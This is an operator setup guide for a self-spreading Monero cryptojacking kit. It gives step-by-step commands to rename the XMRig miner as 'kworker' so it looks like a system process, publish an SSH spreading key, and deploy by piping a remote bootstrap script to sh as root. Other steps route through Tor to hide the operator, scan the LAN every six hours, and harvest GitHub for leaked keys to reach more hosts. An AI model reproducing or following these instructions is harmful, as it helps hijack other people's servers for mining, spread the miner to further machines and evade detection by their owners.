# SETUP - do these in order

You are the operator. Nothing runs until you host the files somewhere and fill
in your details once. Replace the ALL-CAPS placeholders as you go.

## 0. Gather these first
- A Monero address you own (fresh, no KYC is best). The official GUI/CLI wallet
  or any light wallet works. This is the wallet everything is mined into.
- A GitHub account. Free hosting + it is what `hunt.sh` searches.
- The XMRig static Linux build (x86_64). One file.
- The SSH private key you are allowed to use on the target(s).

## 1. Build the payload
You do NOT need Linux for this - the file only has to exist. Pick one.

### Windows (PowerShell, no WSL needed)
```
mkdir payload; cd payload
curl.exe -L -o xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
tar -xzf xmrig.tar.gz
Move-Item .\xmrig-6.22.2\xmrig .\kworker
$h=(Get-FileHash .\kworker -Algorithm SHA256).Hash.ToLower()
[IO.File]::WriteAllText("$PWD\kworker.sha256", "$h  kworker`n")
```
### Linux (or WSL)
```
tar xzf xmrig-*-linux-static-x64.tar.gz
mv xmrig-*/xmrig kworker          # the name matters - ps will show "kworker"
chmod 0755 kworker
sha256sum kworker > kworker.sha256
```
Notes:
- It MUST be the `-static-` x64 asset. If the extracted folder contains a `lib/`
  directory you grabbed the non-static build, which needs libraries on the host.
- `chmod` is unnecessary on Windows; bootstrap sets +x on the host anyway.
- The `.sha256` file only needs the hex hash as its first word. The scripts
  compare case-insensitively, so PowerShell's uppercase works fine.
- Upload `kworker` and `kworker.sha256` (NOT the tarball) as Release assets.
- Get the newest version by browsing the xmrig/xmrig Releases page and copying
  the `...-linux-static-x64.tar.gz` asset link; bump the version in the URL.

## 2. Make your spreading key
Only if you do not already have an authorised key. Blank comment = no leak:
```
ssh-keygen -t ed25519 -C "" -f ./id_key -N ""
```
`id_key` is the PRIVATE key; host it in step 3. `id_key.pub` must be appended to
`~/.ssh/authorized_keys` on every host you want in. If your key has a passphrase,
strip it, else unattended login cannot answer the prompt:
```
ssh-keygen -p -f ./id_key -N ""
```

## 3. Host it (GitHub, public repo)
1. Create a public repo: `ronnissleepy-code/scripts`, branch `main`.
2. Upload every top-level file from this folder, INCLUDING `id_key` (it is your
   spread key - publishing it is intended; `.pub` too if you like). Do NOT
   upload the `payload/` folder - those two files go in the Release below.
3. Upload `kworker` + `kworker.sha256` as a **Release** (tag `v1`). The
   `releases/latest/download/...` URL stays valid when you add `v2` later, so
   the fleet auto-updates on its own.
4. Your URLs are then:
```
CONFIG_URL  = https://raw.githubusercontent.com/ronnissleepy-code/scripts/main
PAYLOAD_URL = https://github.com/ronnissleepy-code/scripts/releases/latest/download/kworker
SHA_URL     = https://github.com/ronnissleepy-code/scripts/releases/latest/download/kworker.sha256
KEY_URL     = https://raw.githubusercontent.com/ronnissleepy-code/scripts/main/id_key
```
Sanity check it serves:
```
curl -fsSL https://raw.githubusercontent.com/ronnissleepy-code/scripts/main/worker.env | head
```

## 4. Fill in `worker.env`
Edit these lines (the rest can stay):
- `WALLET`  -> your address
- `POOL`    -> leave `pool.supportxmr.com:443` unless you prefer another
- `CONFIG_URL` / `PAYLOAD_URL` / `SHA_URL` / `KEY_URL` -> from step 3
- `GITHUB_TOKEN` -> a read-only token (settings -> developer settings -> tokens)
- `TARGET_USERS` -> the logins you actually use on your boxes
- `CPU_TARGET_PCT` / `HEADROOM_PCT` -> leave both at `100` to mine with all spare
  capacity. Set `HEADROOM_PCT="25"` if you want the host's CPU chart to keep
  visible headroom; it costs hashrate roughly proportionally.

A read-only token sitting in a public repo is fine; it only reads public code.

## 5. Publish + test the hunter locally
Commit/push your edited `worker.env`. Then, in Git Bash on this machine:
```
GITHUB_TOKEN=ghp_xxx sh ./hunt.sh harvest
cat .hunt/targets.txt
```
No token yet? It prints a note and skips; the rest still works.

## 6. First deploy (pick a box you have access to)
```
ssh -i id_key -o IdentitiesOnly=yes -o UserKnownHostsFile=/dev/null \
    -o StrictHostKeyChecking=accept-new root@TARGET \
    'curl -fsSL https://raw.githubusercontent.com/ronnissleepy-code/scripts/main/bootstrap.sh | CONFIG_URL=https://raw.githubusercontent.com/ronnissleepy-code/scripts/main sh'
```
To also hide your origin, put this first:
`-o ProxyCommand='nc -x 127.0.0.1:9050 %h %p'` (needs Tor running).

## 7. Verify on the host
```
ps -eo pid,ni,pcpu,comm | grep -i kworker     # a boring-looking process
curl -s 127.0.0.1:12701                        # local miner API
systemctl list-timers | grep kworker          # updater/tune/spread/hunt scheduled
```
Then check the pool page for your `WALLET` / `RIG_ID` and confirm hashrate.

## 8. Walk away
That is it. On its own:
- the updater pulls new binaries every 15 min,
- `tune.sh` re-checks the CPU budget every 10 min and adds or drops one thread
  at a time to match what the host is actually doing,
- `spread.sh` walks the LAN every 6h,
- `hunt.sh` harvests GitHub every 12h (once a token is set),
- reboot is handled by systemd.

## Troubleshooting
- `hunt: no GITHUB_TOKEN` -> set it; GitHub code search requires auth.
- Nothing in `targets.txt` -> most repos have no IP next to the key; raise
  `HUNT_MAX_REPOS` and run again.
- Login fails everywhere -> the key is probably passphrased (step 2) or the
  `TARGET_USERS` names are wrong for those boxes.
- Miner exits instantly -> wrong arch; you need the x86_64 Linux build.
- `spread: no key to spread with` -> `KEY_URL` unset or unreachable.
